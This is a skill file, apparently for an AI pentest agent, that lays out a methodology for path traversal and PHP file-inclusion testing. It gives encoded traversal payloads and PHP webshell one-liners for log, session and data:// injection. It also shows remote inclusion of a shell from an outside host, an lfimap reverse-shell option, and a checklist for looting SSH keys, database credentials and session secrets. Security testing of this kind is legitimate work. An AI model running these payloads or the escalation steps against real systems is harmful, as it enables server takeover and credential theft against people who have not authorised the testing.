---
name: path-traversal-testing
description: Methodology for path traversal and local/remote file inclusion (WSTG-ATHZ-01, WSTG-INPV-11/12, CWE-22/CWE-98) — reading files outside the web root with encoded ../ sequences, escalating PHP LFI to RCE via wrappers/log poisoning/session files, and RFI. Use on any parameter that names a file, path, template, or page (file=, page=, path=, template=, lang=, download=, include=, doc=, view=).
license: Apache-2.0
metadata:
  author: Section9Labs
  wstg: WSTG-INPV-11
  cwe: CWE-22
---

# Path Traversal & File Inclusion (WSTG-ATHZ-01 / WSTG-INPV-11/12, CWE-22 / CWE-98)

Goal: make a file-naming parameter read files outside its intended directory
(traversal, CWE-22), include local files into executed code (LFI → RCE), or
include remote code (RFI, CWE-98).

Every parse/handoff step ends in a rupu output (work-units array,
`assets.mark`, `findings.report`). JSON shapes: `references/rupu.md`.

## Phase 1 — Candidate selection

Hunt parameters whose *value looks like a file*: `file= page= path= template=
lang= download= include= doc= document= folder= dir= view= show= cat= name=
pg= style= pdf= img=`. Sources: proxy history, katana/gau URL dumps
(`gau example.com | grep -iE '[?&](file|page|path|template|lang|download|include|doc|view)='`),
and any download/export/preview feature. Also note *header/cookie* sinks
(`X-Template`, theme cookies) and upload filename fields.

Baseline each candidate: request the legitimate value, then an obviously
missing file (`?file=zz_nonexistent`). Record the three response classes —
valid file / missing file / blocked — their status codes, lengths, and error
strings. Error text is gold: it leaks absolute paths
(`include(/var/www/app/pages/zz_nonexistent.php)`) telling you the depth, OS,
the appended extension, and whether `include()` (LFI, not just read) is in
play.

**rupu**: mark each candidate as `assets.mark` kind `web:route` with the
`param` coordinate, depth `crawled` (or `mapped` if only guessed). Emit the
candidate list as a work-units array (`for_each:` one unit per url+param) —
see `references/rupu.md`; normalize via the `work-units` skill.

## Phase 2 — Traversal probing

Payload depth ladder, per candidate (full catalog incl. Windows and encodings
in `references/traversal-payloads.md`):

1. Plain: `../../../etc/passwd` at depths 1–10 (`../` × N). Match on
   `root:x:0:0:` (or `root:` to tolerate variants). Windows:
   `..\..\..\windows\win.ini` match `[fonts]` / `[extensions]`.
2. Absolute path: `?file=/etc/passwd` — many sinks accept it outright.
3. Encodings, in escalation order:
   `%2e%2e%2f` (single URL-encode) → `%252e%252e%252f` (double, for
   decode-after-validate) → `..%2f` / `%2e%2e/` (mixed) →
   `..%c0%af` / `..%ef%bc%8f` (overlong/fullwidth UTF-8) →
   `....//` and `....\/` (beats non-recursive `../`-strip filters) →
   `..\\` and `..%5c` (Windows separators).
4. Suffix handling when the app appends an extension (error said
   `pages/<input>.php`): null byte `%00` (legacy PHP < 5.3.4), long-path
   truncation, `?` / `#` tricks, or use `php://filter` (Phase 3) which
   tolerates the suffix via `/resource=../..`.
5. Prefix handling when input is appended to a base dir: traversal is the
   play; when the input must *start* with an allowed dir:
   `?file=templates/../../../etc/passwd`.

High-value read targets once traversal works: `/etc/passwd`, `/etc/shadow`
(if root), app configs (`config.php`, `.env`, `wp-config.php`,
`application.yml`, `settings.py`), `/proc/self/environ`,
`/proc/self/cmdline`, `/proc/self/maps`, SSH keys, `C:\Windows\win.ini`,
IIS `web.config`, `unattend.xml`. Full list in the reference.

Automate with the tools (exact flags in `references/tools.md`):

```
# DotDotPwn — fuzz the marker position; -k is the success match pattern
dotdotpwn -m http-url -u "http://192.0.2.10/view?file=TRAVERSAL" -k "root:" -d 8 -o unix
dotdotpwn -m stdout -d 6 > trav_words.txt        # wordlist for ffuf

# ffuf — traversal wordlist against the param; filter the baseline size
ffuf -u "http://192.0.2.10/view?file=FUZZ" -w trav_words.txt -mr "root:" -o ffuf_trav.json -of json

# lfimap — full technique sweep (note: -R for request file, not -r)
lfimap -U "http://192.0.2.10/view?file=PWN" -a --log lfimap.out
```

## Phase 3 — LFI → RCE (PHP) and RFI

A traversal that flows into `include`/`require` is LFI: the file is
*executed*, not just read. Full chains in `references/lfi-to-rce.md`.

1. **Read source first**: `?file=php://filter/convert.base64-encode/resource=index.php`
   → base64-decode to get the app's code (creds, more sinks). Works even
   with an appended `.php`.
2. **php://input**: POST `<?php system($_GET['c']); ?>` with
   `?file=php://input&c=id` (needs `allow_url_include=On`).
3. **data://**: `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8%2B&c=id`
   (also needs `allow_url_include`).
4. **expect://**: `?file=expect://id` (expect extension installed).
5. **php://filter chain RCE**: the `convert.iconv.*` filter-chain technique
   generates arbitrary PHP from garbage — works with *no* uploads, no logs,
   default php.ini. See `references/lfi-to-rce.md`.
6. **Log poisoning**: plant `<?php system($_GET['c']); ?>` in a log via the
   User-Agent (access log) or a bogus username (auth/SSH log), then include
   `/var/log/apache2/access.log` etc. One shot per log — a broken payload
   poisons the file until rotation.
7. **/proc/self/environ**: include it with a PHP payload in User-Agent
   (older setups).
8. **Session files**: set a session value you control (username, search
   term) to a PHP payload, include
   `/var/lib/php/sessions/sess_<PHPSESSID>`.
9. **phpinfo race**: phpinfo page + LFI → race the uploaded temp file
   (classic `phpinfolfi.py` technique).
10. **Uploaded file include**: pair with the `file-upload-testing` skill —
    include a stored image polyglot (`?file=../../uploads/pic.jpg`).
11. **RFI**: `?page=http://198.51.100.9/shell.txt` (payload WITHOUT `.php`
    so your server doesn't execute it) when `allow_url_include=On`. Confirm
    the fetch even when execution fails: `?page=http://<id>.oast.pro/x` and
    watch interactsh (`interactsh-client -v -json -o oob.json`; a DNS-only
    hit still proves outbound fetch).

lfimap automates most of this: `-a` tries all techniques, `-x --lhost
198.51.100.9 --lport 4444` auto-exploits to a reverse shell, `--callback`
sets the OOB host. Read `references/tools.md` for output interpretation.

## Phase 4 — Parse, record, report (rupu)

Normalize every confirmed hit with the parser:

```
python3 scripts/parse_lfi.py --lfimap lfimap.out --dotdotpwn ddp.out \
  --ffuf ffuf_trav.json --hits manual_hits.json \
  --merged lfi_hits.json --work-units lfi_units.json --findings lfi_findings.json
```

- `lfi_hits.json`: merged normalized hits
  `{url, param, payload, technique, file_read, evidence, rce}`.
- `lfi_units.json`: work-units **array** — one unit per confirmed hit for
  escalation fan-out (read→RCE attempts, config looting). Hand to the
  `work-units` skill / `for_each:`.
- `lfi_findings.json`: ready `findings.report` payloads. Submit each via the
  `finding-report` skill: scope `endpoint`, `target_ref` = affected URL,
  severity **high** for file read, **critical** for RCE/RFI,
  classification `WSTG-INPV-11` (traversal/LFI) or `WSTG-INPV-12` +
  `CWE-22` / `CWE-98`, evidence = the request and the leaked file content /
  command output. Attach the real HTTP exchange before submitting.
- `assets.mark` every probed route: depth `tested` after the sweep,
  `exploited` for confirmed read/RCE. Shapes in `references/rupu.md`.

## Escalation checklist after a confirmed read

- Loot configs → DB creds → sqlmap direct connection or admin panels.
- `/proc/self/environ` + `cmdline` → identify the app server, paths, secrets.
- SSH keys (`/home/*/.ssh/id_rsa`, `/root/.ssh/id_rsa`) → host access.
- Source via `php://filter` → find more vulns (hand sinks to `sqlmap`,
  `dalfox`, deserialization skills as appropriate).
- Session/cookie secrets (`APP_KEY`, `secret_key_base`) → forge sessions.

## References

- `references/traversal-payloads.md` — encodings, depth tables, Unix/Windows
  target file lists, filter-bypass matrix.
- `references/lfi-to-rce.md` — PHP wrappers, filter-chain RCE, log
  poisoning, sessions, phpinfo race, RFI.
- `references/tools.md` — DotDotPwn, lfimap, ffuf: full flags and output
  parsing.
- `references/rupu.md` — exact work-unit / assets.mark / findings.report JSON.
